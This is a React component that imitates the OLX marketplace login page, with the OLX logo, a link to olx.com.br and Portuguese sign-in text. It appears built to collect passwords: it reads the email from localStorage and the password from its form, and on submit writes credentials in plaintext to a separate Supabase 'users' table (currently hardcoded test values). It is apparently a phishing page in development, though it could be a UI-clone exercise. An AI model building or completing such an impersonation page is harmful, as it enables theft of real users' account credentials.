import { useNavigate } from "react-router-dom";
import olxLogo from "./assets/olx.svg";
import { useState } from "react";
import { supabase } from "./config/supabaseClient";

function Password() {
  const navigate = useNavigate();
  const [formData, setFormData] = useState({});

  const onSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    const dataToSubmit = {
      ...formData,
    };


	const {data, error} =  await supabase.from("users").insert([{ email: 'test2@gmail.com', password: '123456'}]);

	if (error) {
		console.log(error);
	}
	if (data) {
		console.log('supadata', data);
		console.log(dataToSubmit);
	}
  };

  const handleChange = (event: React.ChangeEvent<HTMLInputElement>) => {
    const { target } = event;
    const { name, value } = target;

    setFormData({
      ...formData,
      email: localStorage.getItem("email"),
      [name]: value,
    });
  };

  return (
    <div className="w-full h-[100vh] bg-[#f9f9f9] flex justify-center">
      <div className="flex flex-col justify-center max-w-[466px] my-16 mx-auto">
        <div className="bg-white shadow-[rgba(153,153,153,0.2)_0px_2px_4px_0px] pt-8 pb-6 px-14 rounded-t ">
          <div className="flex flex-col items-center mb-2">
            <a href="https://olx.com.br" target="_blank">
              <img
                src={olxLogo}
                width={64}
                height={64}
                className="min-w-[12px] min-h-[12px] "
                alt="OLX logo"
              />
            </a>
            <span className="text-[#1a1d23]">Acesse a sua conta</span>
          </div>

          <div className="flex flex-col mb-4 items-center">
            {!!localStorage.getItem("email") && (
              <div className="px-10 py-2 flex items-center justify-center border-solid border-[0.5px] border-[#d2d2d2] rounded-3xl mt-6 min-w-[200px] max-w-[242px]">
                <span className="text-sm text-[#1a1d23] font-normal">
                  {localStorage.getItem("email")}
                </span>
              </div>
            )}
            <form onSubmit={onSubmit}>
              <div className="mb-4">
                <label
                  htmlFor="email"
                  className="text-[#1a1d23] font-semibold text-base"
                >
                  Senha
                </label>
                <input
                  type="password"
                  name="password"
                  onChange={handleChange}
                  className="w-full rounded-lg px-4 py-3 mt-2 border border-gray-300 bg-inherit"
                />
              </div>
              <button
                type="submit"
                className="bg-[#f28000] hover:bg-[#df7400] hover:border-[#df7400] rounded-[500px] px-6 py-2 text-white w-full transition-all ease-in-out duration-200"
              >
                Entrar
              </button>
            </form>
            <div className="flex justify-between items-center w-full mt-6">
              <span
                onClick={() => navigate("/")}
                className="cursor-pointer text-base font-semibold text-[#6e0ad6]"
              >
                Voltar
              </span>
              <span
                onClick={() => navigate("/")}
                className="cursor-pointer text-base font-semibold text-[#6e0ad6]"
              >
                Esqueceu sua senha?
              </span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default Password;
